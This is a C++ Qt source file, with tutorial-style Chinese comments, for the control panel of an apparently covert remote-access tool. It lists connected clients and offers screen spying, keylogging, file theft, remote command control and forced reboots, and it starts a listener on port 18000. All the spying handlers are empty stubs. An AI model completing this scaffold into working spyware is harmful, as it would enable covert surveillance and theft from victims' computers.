#include "widget.h"
#include "ui_widget.h"

Widget::Widget(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Widget)
{
    ui->setupUi(this);

    // 先设置窗口的头相，资源图片在上面下载
       this->setWindowIcon(QIcon("./app.ico"));
       this->setWindowTitle("Easytab");

       // 设置窗口大小
       const int w = 600, h = 500;


       // 将窗口至中，你必须在widget.h里#include <QDesktopWidget>
       // 以后我就不再多说了，没有include的类就自己在.h文件里include
       const int x = (QApplication::desktop()->width() - w) / 2;
       const int y = (QApplication::desktop()->height() - h) / 2;
       this->setGeometry(x, y, w, h);
       this->setMaximumSize(QSize(w, h));
       this->setMinimumSize(QSize(w, h));

       // 设置按钮，暂定四个主要功能（屏幕监控，键盘监控，文件盗取，命令行控制）
       // 其他功能以后有需要再加
       QPushButton *btScreenSpy = new QPushButton(QIcon("./screen.png"),"屏幕监控", this);
       btScreenSpy->setIconSize(QSize(60,60));
       // 建立响应点击信息，槽函数你需要在widget.h里增加
       connect(btScreenSpy, SIGNAL(clicked(bool)), this, SLOT(screenSpyClicked()));
       btScreenSpy->setGeometry(0,0,150, 100);

       QPushButton *btKeyboardSpy = new QPushButton(QIcon("./keyboard.png"),"键盘监控", this);
       btKeyboardSpy->setIconSize(QSize(60,60));
       connect(btKeyboardSpy, SIGNAL(clicked(bool)), this, SLOT(keyboardClicked()));
       btKeyboardSpy->setGeometry(150,0,150,100);

       QPushButton *btFileSpy = new QPushButton(QIcon("./file.png"),"文件监控", this);
       btFileSpy->setIconSize(QSize(60,60));
       connect(btFileSpy, SIGNAL(clicked(bool)), this, SLOT(fileSpyClicked()));
       btFileSpy->setGeometry(2*150,0,150,100);

       QPushButton *btCmdSpy = new QPushButton(QIcon("./command.png"),"命令行控制", this);
       btCmdSpy->setIconSize(QSize(60,60));
       connect(btCmdSpy, SIGNAL(clicked(bool)), this, SLOT(cmdSpyClicked()));
       btCmdSpy->setGeometry(3*150,0,150, 100);

       // 设置QTableWiget来存放上线客户的信息
       mClientTable = new QTableWidget(this);
       mClientTable->setGeometry(0,100,600,400);
       mClientTable->setColumnCount(5);
       mClientTable->setHorizontalHeaderItem(0, new QTableWidgetItem("id"));
       mClientTable->setColumnWidth(0, 80);
       mClientTable->setHorizontalHeaderItem(1, new QTableWidgetItem("用户名"));
       mClientTable->setColumnWidth(1, 160);
       mClientTable->setHorizontalHeaderItem(2, new QTableWidgetItem("ip"));
       mClientTable->setColumnWidth(2, 160);
       mClientTable->setHorizontalHeaderItem(3, new QTableWidgetItem("端口"));
       mClientTable->setColumnWidth(3, 80);
       mClientTable->setHorizontalHeaderItem(4, new QTableWidgetItem("系统"));
       mClientTable->setColumnWidth(4, 120);
       // 设置选中一整行
       mClientTable->setSelectionBehavior(QAbstractItemView::SelectRows);
       // 设置一次最多能选中一样
       mClientTable->setSelectionMode(QAbstractItemView::SingleSelection);
       // 设置不能修改
       mClientTable->setEditTriggers(QAbstractItemView::NoEditTriggers);

       // 增加三个槽函数在这个类
       // 增加客户到列表函数：addClientToTable(id, 电脑名, ip, 端口, 系统型号);
       // 从列表中删除客户：removeClientFromTable(id);
       // 获取当前客户ID： currentClientIdFromTable();

       // 当右击客户列表时弹出的操作菜单，比如重启客户的电脑
       mPopupMenu = new QMenu(this);
       QAction *actSendMessage = mPopupMenu->addAction("发送弹窗消息");
       connect(actSendMessage,SIGNAL(triggered(bool)), this, SLOT(sendMessageClicked()));
       QAction *actReboot = mPopupMenu->addAction("重新开机");
       connect(actReboot,SIGNAL(triggered(bool)), this,SLOT(rebootClicked()));
       QAction *actQuit = mPopupMenu->addAction("强制下线");
       connect(actQuit, SIGNAL(triggered(bool)), this, SLOT(quitClicked()));

       // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
       mClientTable->installEventFilter(this);

//       addClientToTable(1, "sumkee911", "127.0.0.1", 8888, "Windows 7");

       mZeroServer = new ZeroServer(this);
       connect(mZeroServer, SIGNAL(clientLogin(int,QString,QString,int,QString)),
               this, SLOT(addClientToTable(int,QString,QString,int,QString)));
       connect(mZeroServer, SIGNAL(clientLogout(int)), this, SLOT(removeClientFromTable(int)));
       mZeroServer->start(18000);

}

Widget::~Widget()
{
    delete ui;
}


void Widget::screenSpyClicked()
{

}

void Widget::keyboardClicked()
{

}

void Widget::fileSpyClicked()
{

}

void Widget::cmdSpyClicked()
{

}

void Widget::sendMessageClicked()
{

}

void Widget::rebootClicked()
{

}

void Widget::quitClicked()
{

}

void Widget::addClientToTable(int id, QString name, QString ip, int port, QString systemInfo)
{
    int count = mClientTable->rowCount();
    mClientTable->setRowCount(count+1);

    QTableWidgetItem *itemId = new QTableWidgetItem(QString::number(id));
    mClientTable->setItem(count, 0 , itemId);

    QTableWidgetItem *itemName = new QTableWidgetItem(name);
    mClientTable->setItem(count, 1 , itemName );

    QTableWidgetItem *itemIp = new QTableWidgetItem(ip);
    mClientTable->setItem(count, 2 , itemIp);

    QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
    mClientTable->setItem(count, 3 , itemPort);

    QTableWidgetItem *itemSystemInfo = new QTableWidgetItem(systemInfo);
    mClientTable->setItem(count, 4 , itemSystemInfo);
}

void Widget::removeClientFromTable(int id)
{
    // 用ID判断该删除的行索引
    int count = mClientTable->rowCount();
    for (int i =0; i< count; ++i) {
        if (mClientTable->item(i, 0)->text().toInt() == id) {
            // 删除
            mClientTable->removeRow(i);
            break;
        }
    }
}

int Widget::currentClientIdFromTable()
{
    int index = mClientTable->currentRow();
    if (index == -1) {
        return -1;
    }
    return mClientTable->itemAt(index, 0)->text().toInt();
}

bool Widget::eventFilter(QObject *watched, QEvent *event)
{

    // 右键弹出菜单
    if (watched==(QObject*)mClientTable) {
        if (event->type() == QEvent::ContextMenu) {
            mPopupMenu->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}
